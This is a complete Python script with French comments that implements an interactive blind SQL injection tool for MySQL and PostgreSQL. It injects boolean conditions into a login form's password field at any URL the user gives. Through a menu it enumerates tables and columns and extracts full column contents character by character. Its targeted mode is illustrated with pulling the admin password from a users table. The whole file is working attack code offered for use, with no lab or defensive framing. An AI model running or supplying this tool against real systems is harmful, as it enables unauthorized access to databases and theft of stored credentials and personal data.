import requests
import string
import sys

# --- CONFIGURATION GLOBALE ---
ALPHABET = string.ascii_letters + string.digits + "_-.,:;@#$%&!?'() "
TARGET_URL = ""
SUCCESS_STR = ""

# Ces variables seront configurées automatiquement selon ton choix de DB
DB_COMMENT = ""       # '-- -' ou '--'
DB_SCHEMA_FILTER = "" # 'table_schema=database()' ou "table_schema='public'"

# --- MOTEUR D'INJECTION ---

def get_boolean_response(payload):
    """ Envoie l'injection et retourne True/False selon la réponse """
    # On ferme la chaine avec n' et on ajoute la condition + le commentaire adapté
    injection = f"n' OR {payload} {DB_COMMENT}"
    
    data = {
        'username': 'admin',
        'password': injection, # Adapte le nom du champ si nécessaire
        'login': 'Login'
    }

    try:
        r = requests.post(TARGET_URL, data=data)
        return SUCCESS_STR in r.text
    except Exception as e:
        print(f"\n[!] Erreur réseau : {e}")
        sys.exit(1)

def get_length(sql_query, description="l'élément"):
    """ Trouve la longueur du résultat """
    print(f"[*] Calcul taille ({description})...", end='', flush=True)
    for i in range(0, 100):
        # LENGTH() fonctionne sur MySQL et Postgre
        payload = f"LENGTH(({sql_query})) = {i}"
        if get_boolean_response(payload):
            print(f" {i} car.")
            return i
        if i % 10 == 0: print(".", end='', flush=True)
    
    print("\n[-] Taille non trouvée (ou > 100).")
    return 0

def extract_string(sql_query, length):
    """ Extrait une chaîne caractère par caractère """
    found_data = ""
    for position in range(1, length + 1):
        char_found = False
        for char in ALPHABET:
            # ASCII() et SUBSTR() sont communs aux deux SGBD
            # Cela évite les problèmes de guillemets dans les payloads
            payload = f"ASCII(SUBSTR(({sql_query}), {position}, 1)) = {ord(char)}"
            
            if get_boolean_response(payload):
                found_data += char
                sys.stdout.write(char)
                sys.stdout.flush()
                char_found = True
                break
        
        if not char_found:
            found_data += "?"
            sys.stdout.write("?")
            sys.stdout.flush()
            
    return found_data

# --- FONCTIONS DU DASHBOARD ---

def option_1_tables():
    print("\n--- [1] LISTE DES TABLES ---")
    
    # 1. Compter les tables
    nb_tables = 0
    # La requête utilise information_schema (Standard SQL)
    # DB_SCHEMA_FILTER s'adapte à MySQL ou Postgre
    count_query = f"SELECT count(table_name) FROM information_schema.tables WHERE {DB_SCHEMA_FILTER}"
    
    for i in range(1, 20):
        if get_boolean_response(f"({count_query}) = {i}"):
            nb_tables = i
            break
    
    if nb_tables == 0:
        print("[-] Aucune table trouvée (ou erreur de filtre).")
        return

    print(f"[+] {nb_tables} table(s) détectée(s).")
    
    # 2. Récupérer les noms
    for i in range(nb_tables):
        print(f"\nTable {i+1}: ", end='')
        # LIMIT / OFFSET fonctionne sur les deux (MySQL et Postgre)
        query = f"SELECT table_name FROM information_schema.tables WHERE {DB_SCHEMA_FILTER} LIMIT 1 OFFSET {i}"
        
        length = get_length(query, "nom")
        if length > 0:
            print(f"  > Nom : ", end='')
            extract_string(query, length)
            print("")

def option_2_columns():
    print("\n--- [2] TROUVER LES COLONNES ---")
    table = input("Nom de la table à analyser : ").strip()
    if not table: return

    # 1. Compter les colonnes
    nb_cols = 0
    count_query = f"SELECT count(column_name) FROM information_schema.columns WHERE table_name='{table}'"
    
    for i in range(1, 30):
        if get_boolean_response(f"({count_query}) = {i}"):
            nb_cols = i
            break
    print(f"[+] {nb_cols} colonnes trouvées.")

    # 2. Lister les noms
    for i in range(nb_cols):
        print(f"Col {i+1}: ", end='')
        query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT 1 OFFSET {i}"
        length = get_length(query, "colonne")
        if length > 0:
            extract_string(query, length)
            print("")

def option_3_dump_column():
    print("\n--- [3] DUMP D'UNE COLONNE ---")
    table = input("Table : ").strip()
    col = input("Colonne à extraire : ").strip()
    if not table or not col: return

    # 1. Compter les lignes
    print(f"[*] Comptage des lignes...")
    nb_rows = 0
    for i in range(0, 50):
        if get_boolean_response(f"(SELECT count(*) FROM {table}) = {i}"):
            nb_rows = i
            break
    print(f"[+] {nb_rows} ligne(s).")

    # 2. Extraire
    for i in range(nb_rows):
        print(f"\n[Ligne {i+1}] ", end='')
        # Attention : Postgre demande parfois un cast ::text si la colonne est un nombre, 
        # mais ASCII() gère ça généralement bien.
        query = f"SELECT {col} FROM {table} LIMIT 1 OFFSET {i}"
        length = get_length(query, "valeur")
        if length > 0:
            print("  > ", end='')
            extract_string(query, length)
            print("")

def option_4_specific_value():
    print("\n--- [4] RECHERCHE CIBLÉE (WHERE) ---")
    print("Ex: SELECT password FROM users WHERE username = 'admin'")
    
    table = input("Table : ").strip()
    target_col = input("Colonne cible : ").strip()
    where_col = input("Colonne condition : ").strip()
    where_val = input("Valeur condition : ").strip()
    
    if not table or not target_col: return

    query = f"SELECT {target_col} FROM {table} WHERE {where_col} = '{where_val}'"
    length = get_length(query, "cible")
    
    if length > 0:
        print(f"[+] Résultat : ", end='')
        extract_string(query, length)
        print("")
    else:
        print("[-] Rien trouvé.")

# --- MAIN ---

if __name__ == "__main__":
    print("=== UNIFIED BLIND SQL INJECTOR (MySQL & PostgreSQL) ===")
    
    # 1. Configuration Initiale
    TARGET_URL = input("URL complète : ").strip()
    SUCCESS_STR = input("Condition de succès (mot clé) : ").strip()
    
    print("\nQuel est le type de base de données ?")
    print("1. MySQL (utilise information_schema, comment '-- -')")
    print("2. PostgreSQL (utilise information_schema, comment '--')")
    db_choice = input("Choix (1 ou 2) > ").strip()

    if db_choice == '1':
        print("[*] Mode MySQL activé.")
        DB_COMMENT = "-- -"
        DB_SCHEMA_FILTER = "table_schema=database()" 
    elif db_choice == '2':
        print("[*] Mode PostgreSQL activé.")
        DB_COMMENT = "--"
        DB_SCHEMA_FILTER = "table_schema='public'" # Par défaut sur Postgres
    else:
        print("Choix invalide.")
        sys.exit(1)

    # 2. Boucle du Dashboard
    while True:
        print("\n" + "="*30)
        print(" MENU")
        print("="*30)
        print(" 1. Tables")
        print(" 2. Colonnes")
        print(" 3. Dump Colonne")
        print(" 4. Ciblage (WHERE)")
        print(" 9. Quitter")
        
        choice = input("\n> ")
        
        if choice == '1': option_1_tables()
        elif choice == '2': option_2_columns()
        elif choice == '3': option_3_dump_column()
        elif choice == '4': option_4_specific_value()
        elif choice == '9': break
        else: print("?")